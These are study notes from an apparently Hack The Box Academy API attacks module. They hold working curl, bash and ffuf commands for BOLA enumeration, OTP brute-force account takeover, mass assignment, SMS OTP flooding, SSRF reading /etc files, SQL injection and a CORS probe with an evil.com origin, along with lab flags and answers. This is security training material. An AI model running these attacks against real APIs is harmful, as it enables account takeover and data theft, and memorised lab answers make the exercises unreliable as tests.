# HTB Academy — API Attacks Module Notes

**Module:** API Attacks (Sections 1–13)
**Topics:** REST API Attacks | OWASP API Top 10 | Auth Bypass | BOLA | Mass Assignment | Rate Limiting | Injection | Security Misconfigurations

---

## General Exercise Methodology

Every exercise follows the same pattern. Do not skip steps.

1. **Authenticate** — use command substitution, never paste a raw JWT
2. **Check roles** — role name maps exactly to endpoint name
3. **Enumerate swagger** — dump all paths, get schema for target endpoint
4. **Send one request, read ALL fields** — flag is often in an unexpected field
5. **Apply the section's attack** — one technique per section, don't overcomplicate

**Key rules:**
- Re-authenticate if any command returns empty output — JWT expired
- JWT set inside a script subshell does NOT persist to current shell
- Always write loops to `/tmp/script.sh` and run with `bash`
- Error messages reveal required field names — read them before changing anything
- `current-user` endpoints require only a valid JWT, no role

**Known accounts across exercises:**
- Customer emails: `MasonJenkins@ymail.com`, `htbpentesterN@hackthebox.com`
- Supplier emails: `htbpentesterN@pentestercompany.com`
- Account domains: `@hackthebox.com` = customers, `@pentestercompany.com` = suppliers

---

## Flags Summary

| Section | Vulnerability | Attack | Answer |
|---------|--------------|--------|--------|
| 3 | BOLA (API1) | Enumerate `/api/v1/suppliers/quarterly-reports/{ID}` IDs 1–20 | `HTB{e76651e1f516eb5d7260621c26754776}` |
| 4 | Broken Auth (API2) | OTP brute-force via email reset flow | `HTB{115a6329120e9eff13c4ec6a63343ed1}` |
| 5 | Excessive Data Exposure (API3) | Customer reads `email` from `/api/v1/supplier-companies` | `HTB{d759c70b5a9f6a392af78cc1eca9cdf0}` |
| 5 | Mass Assignment (API3) | Set `NetSum: 0` on `POST /api/v1/customers/orders/items` | `HTB{4d86794f82046e465ca29d91bdbe5bca}` |
| 6 | Resource Consumption (API4) | Spam SMS OTP endpoint 11 times | `HTB{01de742d8cd942ad682aeea9ce3c5428}` |
| 7 | BFLA (API5) | `GET /api/v1/customers/billing-addresses` with no roles | `HTB{1e2095c564baf0d2d316080217040dae}` |
| 8 | Business Flows (API6) | Filter billing addresses by customer ID | `788 Sauchiehall St.` |
| 9 | SSRF (API7) | PATCH product `PNGPhotoFileURI` → `file:///etc/flag.conf`, GET photo | `HTB{3c94232c4f0b0a544ae4024833eef0b3}` |
| 10 | SQLi (API8) | `a' OR 1=1 --` on `/api/v1/suppliers/{Name}/count` | `151` |
| 10 | CORS (API8) | `Origin: http://evil.com` header → `Access-Control-Allow-Origin: *` | `Access-Control-Allow-Origin: *` |
| 11 | Inventory Management (API9) | `GET /api/v0/supplier-companies/deleted` (no auth) | `HTB{43c2754afea99eba70fb2c8dc443c660}` |
| 12 | Unsafe Consumption (API10) | `GET /api/v0/suppliers/deleted` → Yara MacDonald `PasswordHash` | `006006C3167E90A7575A12E474218D86` |

---

## Section 1: Introduction to API Attacks

### OWASP API Security Top 10 (2023)

| ID | Name |
|----|------|
| API1 | Broken Object Level Authorization (BOLA) |
| API2 | Broken Authentication |
| API3 | Broken Object Property Level Authorization |
| API4 | Unrestricted Resource Consumption |
| API5 | Broken Function Level Authorization |
| API6 | Unrestricted Access to Sensitive Business Flows |
| API7 | Server Side Request Forgery |
| API8 | Security Misconfiguration |
| API9 | Improper Inventory Management |
| API10 | Unsafe Consumption of APIs |

REST APIs are the focus. Same vulnerabilities can exist in GraphQL, SOAP, gRPC.

---

## Section 2: Introduction to Lab

- **App:** Inlanefreight E-Commerce Marketplace — multi-tenant REST API (ASP.NET Core / Kestrel)
- **Swagger UI:** `/swagger` — 60+ endpoints across groups: Authentication, Customers, Products, Roles, Supplier-Companies, Suppliers
- **Access control:** RBAC — role name = endpoint name (e.g., `Suppliers_GetAll` → `GET /api/v1/suppliers`)
- **Account domains:** `@hackthebox.com` = customers | `@pentestercompany.com` = suppliers

### Key commands
```bash
# Fingerprint
curl -si http://<TARGET>/swagger | grep -i "server:"

# All endpoint paths
curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep '"/api/'

# Endpoint schema
curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep -A 30 "<CommandName>"
```

---

## Section 3: Broken Object Level Authorization (API1:2023)

**CWE-639** — API accepts user-controlled ID but doesn't verify ownership.

### Attack Pattern
1. Authenticate → check roles → role name maps to endpoint with `{ID}`
2. Loop integer IDs — access objects belonging to other users

### Commands
```bash
cat > /tmp/bola.sh << 'EOF'
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/suppliers/sign-in' -H 'Content-Type: application/json' -d '{"Email":"<EMAIL>","Password":"<PASS>"}' | jq -r '.jwt')
for ((i=1; i<=20; i++)); do
  echo "=== ID $i ==="
  curl -s "http://<TARGET>/api/v1/suppliers/quarterly-reports/$i" -H "Authorization: Bearer $JWT" | jq
done
EOF
bash /tmp/bola.sh
```

### Exercise Result
- User: `htbpentester2@pentestercompany.com` | Role: `Suppliers_GetQuarterlyReportByID`
- Endpoint: `GET /api/v1/suppliers/quarterly-reports/{ID}`
- Flag at ID 8, `commentsFromManager` field → `HTB{e76651e1f516eb5d7260621c26754776}`

---

## Section 4: Broken Authentication (API2:2023)

**CWE-307** — No rate limiting on OTP/password reset endpoints allows unlimited brute-force.

### Attack Pattern — OTP Reset
1. Trigger OTP for target email
2. Immediately brute-force with ffuf — OTP expires in 5 minutes
3. Sign in as target → access `current-user` endpoints

### Commands
```bash
# Trigger OTP
curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/passwords/resets/email-otps' -H 'Content-Type: application/json' -d '{"Email":"<TARGET_EMAIL>"}' | jq
```
```bash
# Brute-force OTP immediately after
ffuf -X POST -u 'http://<TARGET>/api/v1/authentication/customers/passwords/resets' -H 'Content-Type: application/json' -d '{"Email":"<TARGET_EMAIL>","OTP":"FUZZ","NewPassword":"NewP@ssw0rd1"}' -w <(seq -w 0 9999):FUZZ -t 10 -mr '"SuccessStatus"\s*:\s*true'
```

**Critical:** Use `<(seq -w 0 9999)` — not a file. Use `-t 10` not 100. Use `-mr` not `-fr`.

### Exercise Result
- Target: `MasonJenkins@ymail.com` | OTP: `2330`
- Flag at `GET /api/v1/customers/payment-options/current-user` → `accountNumber` field
- Flag: `HTB{115a6329120e9eff13c4ec6a63343ed1}`

---

## Section 5: Broken Object Property Level Authorization (API3:2023)

Two subclasses:

### Excessive Data Exposure (CWE-213)
GET endpoint returns sensitive fields the caller shouldn't see.

1. Call every accessible GET endpoint
2. Read ALL response fields — flag in `email`, `isExemptedFromMarketplaceFee`, etc.

### Mass Assignment (CWE-915)
POST/PATCH endpoint accepts server-computed fields from the client.

1. Get swagger schema for the endpoint: `grep -A 30 "<CommandName>"`
2. Look for `NetSum`, `Price`, `TotalAmount`, `IsExempted`, `Status`
3. Send those fields with `0` or `true`

### Commands
```bash
# Excessive data exposure
curl -s 'http://<TARGET>/api/v1/supplier-companies' -H "Authorization: Bearer $JWT" | jq

# Mass assignment — create order first
curl -s -X POST 'http://<TARGET>/api/v1/customers/orders' -H 'Content-Type: application/json' -H "Authorization: Bearer $JWT" -d '{"Date":"2026-06-23"}' | jq

# Mass assignment — submit items with NetSum: 0
curl -s -X POST 'http://<TARGET>/api/v1/customers/orders/items' -H 'Content-Type: application/json' -H "Authorization: Bearer $JWT" -d '{"OrderID":"<ID>","OrderItems":[{"ProductID":"<ID>","Quantity":1,"NetSum":0}]}' | jq
```

### Exercise Results
- Q1: `htbpentester5@hackthebox.com` → `GET /api/v1/supplier-companies` → `email` field → `HTB{d759c70b5a9f6a392af78cc1eca9cdf0}`
- Q2: `htbpentester7@hackthebox.com` → `POST /api/v1/customers/orders/items` → `NetSum: 0` → `HTB{4d86794f82046e465ca29d91bdbe5bca}`

---

## Section 6: Unrestricted Resource Consumption (API4:2023)

**CWE-400** — No rate limiting on endpoints that consume resources (SMS credits, disk, CPU).

### Attack Pattern
Find unauthenticated or low-privilege endpoint → spam in loop → flag appears after threshold.

### Commands
```bash
cat > /tmp/spam.sh << 'EOF'
for i in $(seq 1 100); do
  response=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/passwords/resets/sms-otps' -H 'Content-Type: application/json' -d '{"Email":"MasonJenkins@ymail.com"}')
  echo "Request $i: $response"
  echo "$response" | grep -q "HTB{" && echo "FLAG on request $i!" && break
done
EOF
bash /tmp/spam.sh
```

### Exercise Result
- Endpoint: `POST /api/v1/authentication/customers/passwords/resets/sms-otps` (no role)
- Email: `MasonJenkins@ymail.com` | Flag appeared on request 11
- Flag: `HTB{01de742d8cd942ad682aeea9ce3c5428}`

---

## Section 7: Broken Function Level Authorization (API5:2023)

**CWE-200** — User has no authorization for endpoint, but role check is not implemented.

BOLA = authorized for endpoint, wrong object. BFLA = not authorized for the endpoint at all.

### Attack Pattern
1. Confirm no roles or limited roles
2. Try all collection GET endpoints — BFLA ones return data, secured ones return auth error
3. Read all fields in responses that return data

### Commands
```bash
cat > /tmp/bfla.sh << 'EOF'
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/sign-in' -H 'Content-Type: application/json' -d '{"Email":"<EMAIL>","Password":"<PASS>"}' | jq -r '.jwt')
ENDPOINTS=("/api/v1/supplier-companies" "/api/v1/supplier-companies/yearly-reports" "/api/v1/suppliers" "/api/v1/suppliers/quarterly-reports" "/api/v1/products" "/api/v1/products/discounts" "/api/v1/customers" "/api/v1/customers/payment-options" "/api/v1/customers/orders" "/api/v1/customers/billing-addresses")
for ep in "${ENDPOINTS[@]}"; do
  echo "=== $ep ==="
  curl -s "http://<TARGET>${ep}" -H "Authorization: Bearer $JWT" | jq -c '.' | head -c 300
  echo
done
EOF
bash /tmp/bfla.sh
```

### Exercise Result
- User: `htbpentester9@hackthebox.com` — no roles
- BFLA endpoint: `GET /api/v1/customers/billing-addresses`
- Flag in `street` field → `HTB{1e2095c564baf0d2d316080217040dae}`

---

## Section 8: Unrestricted Access to Sensitive Business Flows (API6:2023)

Downstream consequence of BFLA — exposed data enables business abuse (timing purchases, accessing PII).

### Attack Pattern
Use the BFLA-exposed endpoint, filter for a specific record by ID.

### Commands
```bash
curl -s 'http://<TARGET>/api/v1/customers/billing-addresses' -H "Authorization: Bearer $JWT" | jq '.customersBillingAddresses[] | select(.customerID == "<ID>")'
```

### Exercise Result
- Customer ID: `daa8c984-ba84-4265-8d88-12d6607e511c`
- Answer: `788 Sauchiehall St.` (Glasgow, UK)

---

## Section 9: Server Side Request Forgery (API7:2023)

**CWE-918** — API uses user-controlled input to fetch local files without validation.

### Attack Pattern
1. Get supplier ID
2. Create product with placeholder `PNGPhotoFileURI`
3. PATCH `PNGPhotoFileURI` to `file:///etc/flag.conf`
4. GET product photo → base64-encoded file contents
5. Decode

URI validation accepts: must start with `file://`, must end with `.conf` or `.pdf`.

### Commands
```bash
# Get supplier ID
curl -s 'http://<TARGET>/api/v1/suppliers/current-user' -H "Authorization: Bearer $JWT" | jq

# Create product
curl -s -X POST 'http://<TARGET>/api/v1/products/current-user' -H 'Content-Type: application/json' -H "Authorization: Bearer $JWT" -d '{"NewProduct":{"Name":"TestProduct","Price":10.0,"PNGPhotoFileURI":"NotProvidedYet"}}' | jq

# PATCH to target file
curl -s -X PATCH 'http://<TARGET>/api/v1/products' -H 'Content-Type: application/json' -H "Authorization: Bearer $JWT" -d '{"UpdatedProduct":{"ProductID":"<ID>","SupplierID":"<ID>","Name":"TestProduct","Price":10.0,"PNGPhotoFileURI":"file:///etc/flag.conf"}}' | jq

# Read file
curl -s 'http://<TARGET>/api/v1/products/<PRODUCT_ID>/photo' -H "Authorization: Bearer $JWT" | jq -r '.base64Data' | base64 -d
```

### What Doesn't Work
- Certificate of incorporation endpoint — different app user context, cannot read `/etc/flag.conf`
- Chaining PATCH + GET with `&&` — hides individual errors; run separately

### Exercise Result
- User: `htbpentester11@pentestercompany.com` | Supplier ID: `5d489453-3538-4973-9479-2c37b2a5db73`
- Product ID: `24c39437-fcf4-4982-8155-dcaeea41c556`
- Flag: `HTB{3c94232c4f0b0a544ae4024833eef0b3}`

---

## Section 10: Security Misconfiguration (API8:2023)

### SQL Injection (CWE-89)
Role ending in `ByNameSubstring` or `Count` → endpoint takes string parameter in path.

```bash
# Confirm injectable (trailing apostrophe returns error)
curl -s "http://<TARGET>/api/v1/suppliers/a'/count" -H "Authorization: Bearer $JWT" | jq

# Get total record count
curl -s "http://<TARGET>/api/v1/suppliers/a'%20OR%201=1%20--/count" -H "Authorization: Bearer $JWT" | jq
```

### CORS Misconfiguration
CORS headers only appear when `Origin` header is sent in the request.

```bash
curl -si 'http://<TARGET>/api/v1/suppliers/a/count' -H "Authorization: Bearer $JWT" -H "Origin: http://evil.com" | grep -i "access-control"
```

### Exercise Results
- Q1: `htbpentester13@hackthebox.com` | Role: `Suppliers_GetTotalCountBySupplierNameSubstring` | Total: `151`
- Q2: Header `Access-Control-Allow-Origin: *` (wildcard CORS)

---

## Section 11: Improper Inventory Management (API9:2023)

Legacy API versions left accessible. v0 has no authentication and exposes deleted records.

### Attack Pattern
Check swagger dropdown for v0 → hit deleted endpoints without JWT → v0 uses uppercase field names.

### Commands
```bash
curl -s 'http://<TARGET>/api/v0/supplier-companies/deleted' | jq

# Filter by ID (uppercase ID)
curl -s 'http://<TARGET>/api/v0/supplier-companies/deleted' | jq '.[] | select(.ID == "<ID>")'

# Filter by name
curl -s 'http://<TARGET>/api/v0/suppliers/deleted' | jq '.[] | select(.Name == "<NAME>")'
```

### Exercise Result
- Target ID: `c250cb38-96e3-4ccf-9df2-0a03146a2d0b` (Hack The Box company)
- Flag in `Email` field → `HTB{43c2754afea99eba70fb2c8dc443c660}`

---

## Section 12: Unsafe Consumption of APIs (API10:2023)

**CWE-1357** — API blindly trusts data from another API without validation. If v1 ingests v0 data, sensitive fields (password hashes) propagate to production.

### Commands
```bash
curl -s 'http://<TARGET>/api/v0/suppliers/deleted' | jq '.[] | select(.Name == "Yara MacDonald")'
```

### Exercise Result
- Yara MacDonald `PasswordHash`: `006006C3167E90A7575A12E474218D86`
